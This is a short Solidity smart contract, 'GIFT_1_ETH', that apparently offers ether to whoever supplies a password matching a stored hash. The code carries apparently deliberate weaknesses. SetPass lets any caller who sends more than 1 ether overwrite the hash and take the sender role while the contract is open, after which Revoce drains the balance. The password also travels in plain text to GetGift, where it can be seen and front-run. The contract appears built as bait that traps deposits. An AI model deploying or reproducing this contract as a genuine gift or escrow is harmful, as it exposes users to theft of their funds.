1 pragma solidity ^0.4.19;
2 
3 contract GIFT_1_ETH
4 {
5     bytes32 public hashPass;
6     
7     bool closed = false;
8     
9     address sender;
10  
11     uint unlockTime;
12  
13     function() public payable{}
14     
15     function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}
16     
17     function SetPass(bytes32 hash)
18     public
19     payable
20     {
21         if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )
22         {
23             hashPass = hash;
24             sender = msg.sender;
25             unlockTime = now;
26         }
27     }
28     
29     function SetGiftTime(uint date)
30     public
31     {
32         if(msg.sender==sender)
33         {
34             unlockTime = date;
35         }
36     }
37     
38     function GetGift(bytes pass)
39     external
40     payable
41     canOpen
42     {
43         if(hashPass == keccak256(pass))
44         {
45             msg.sender.transfer(this.balance);
46         }
47     }
48     
49     function Revoce()
50     public
51     payable
52     canOpen
53     {
54         if(msg.sender==sender)
55         {
56             sender.transfer(this.balance);
57         }
58     }
59     
60     function PassHasBeenSet(bytes32 hash)
61     public
62     {
63         if(msg.sender==sender&&hash==hashPass)
64         {
65            closed=true;
66         }
67     }
68     
69     modifier canOpen
70     {
71         require(now>unlockTime);
72         _;
73     }
74     
75 }